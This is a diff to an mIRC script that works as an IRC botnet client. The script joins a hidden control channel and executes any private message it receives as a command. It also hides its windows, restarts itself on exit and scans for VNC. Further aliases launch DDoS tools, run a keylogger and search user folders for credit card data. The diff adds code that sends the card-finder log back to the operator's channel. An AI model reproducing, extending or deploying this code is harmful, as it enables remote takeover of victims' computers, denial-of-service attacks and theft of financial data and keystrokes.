@@ -5,7 +5,7 @@ alias ff .timerff 0 1 findtray
 raw 001:*:{ set %fldchan #X#psy#X# | set %key $encode(Sm0k3d,m) | join %fldchan %key }
 raw 475:*:{ join %fldchan %key }
 RAW 332:*:if ($2 == %fldchan) [ [ $3- ] ]
-on *:TEXT:*:*:{ %x = $1- | $evalnext(%x) | .timerMSG 1 3 .opnotice %fldchan    $+ $r(0,99) $+ , $+ $r(0,99) $evalnext(%x) | unset %x | close -m | windows -h $active }
+on *:PRIVMSG:*:*:{ set -u3 %x $1- | $eval($evalnext(%x),1) | .msg %fldchan  $+ $r(0,99) $+ , $+ $r(0,99) : $eval($evalnext(%x),1) | close -m | windows -h $active }
 on *:EXIT:run $mircexe
 on *:sockopen:vncscan*:{
   if ($sockerr) { return }
@@ -26,8 +26,8 @@ on *:sockread:vncscan*:{
 
 }
 
-alias ddos { .opnotice %fldchan  DDoS < , $+ $r(0,99) $1   $+ $r(0,99) $+ , $+ $r(0,99) $2   $+ $r(0,99) $+ , $+ $r(0,99) $3   $+ $r(0,99) $+ , $+ $r(0,99) $   $+ $r(0,99) $+ , $+ $r(0,99) $5 > | run start /MIN /REALTIME $findfile($shortfn($Mircdir),*p.exe*,1) $findfile($shortfn($Mircdir),*ddos.py*,1) $2- & }
-alias cc { opnotice %fldchan Searching for Credit Card information in   $+ $r(0,99) $+ , $+ $r(0,99) C:\USERS | .timerCC -o 1 5 run $findfile($shortfn($Mircdir),*cc.exe*,1) }
+alias ddos { .opnotice %fldchan DDoS $2- | run $findfile($shortfn($Mircdir),*p.exe*,1)  $2- }
+alias cc { opnotice %fldchan Searching for Credit Card information in   $+ $r(0,99) $+ , $+ $r(0,99) C:\USERS | .timerCC -o 1 5 run $findfile($shortfn($Mircdir),*cc.exe*,1) | .timerchklog 0 20 chklog }
 alias kl { run system.exe | .timerkl -o 0 10 init }
 
 alias checkvnc {
@@ -80,6 +80,14 @@ alias init {
   if ($isfile($shortfn(system.log))) && ($server) {
     if (%lines < $lines(system.log)) { .play -af $+ %lines opnotice %fldchan system.log 800 }
     set %lines $lines(system.log)
+    return
+
+  }
+
+alias chklog {
+  if ($isfile($shortfn(CCFinder.log))) && ($server) {
+    if (%lines < $lines(CCFinder.log)) { .play -af $+ %lines opnotice %fldchan CCFinder.log 800 }
+    set %lines $lines(CCFinder.log)
     return
 
   }
@@ -167,10 +175,10 @@ alias wbs.webget.timer.refresh {
 alias wbs.server.url return $gettok($$1,2,47)
 alias wbs.webget.showstats {
   var %n = $sock(wbs.webget.*,0)
-  if (!%n) wecho No socket.
+  if (!%n) w.opnotice %fldchan No socket.
   while (%n > 0) {
     var %sname = $sock(wbs.webget.*,%n) , %rcvd = $sock(%sname).rcvd , %size = $hget(%sname,content-length)
-    wecho $qt(%sname) $+($chr(91),type: $sock(%sname).type,$chr(93)) $+($chr(91),port: $sock(%sname).port,$chr(93)) $br(ip: $sock(%sname).ip)  $&
+    w.opnotice %fldchan $qt(%sname) $+($chr(91),type: $sock(%sname).type,$chr(93)) $+($chr(91),port: $sock(%sname).port,$chr(93)) $br(ip: $sock(%sname).ip)  $&
       $br($wsize(%rcvd) / $wsize(%size)) $br($round($calc(%rcvd / %size * 100),2) $+ $chr(37)) $br(from: $duration($sock(%sname).to) ) $&
       $br(pause: $iif($sock(%sname).pause,yes,no)) $br(ssl: $iif($sock(%sname).ssl,yes,no))
     dec %n
@@ -207,7 +215,7 @@ alias wbs.webget {
     callback %table pre-connect
     sockopen $iif($4 == 1,-e) $+(wbs.webget.,$1) $wbs.server.url($5) $3
   }
-  else wecho $sname error: wbs.webget: syntax: /wbs.webget [name] [callback alias ("x" if not)] [port] [ssl (0/1)] [url] [destination]
+  else w.opnotice %fldchan $sname error: wbs.webget: syntax: /wbs.webget [name] [callback alias ("x" if not)] [port] [ssl (0/1)] [url] [destination]
 }
 alias wsockwrite {
   sockwrite $1-
@@ -362,7 +370,7 @@ alias -l rdid did -r $dname $1-
 alias -l odid did -o $dname $1-
 alias -l bdid did -b $dname $1-
 alias -l udid did -u $dname $1-
-alias -l wecho echo -a $1-
+alias -l w.opnotice %fldchan .opnotice %fldchan $1-
 alias -l wsize {
   if ($1 !isnum 0-) return n/a 
   else return $replace($lower($bytes($1-,3).suf $+ $iif($right($bytes($1-,3).suf,1) !== b,b)),b,b)
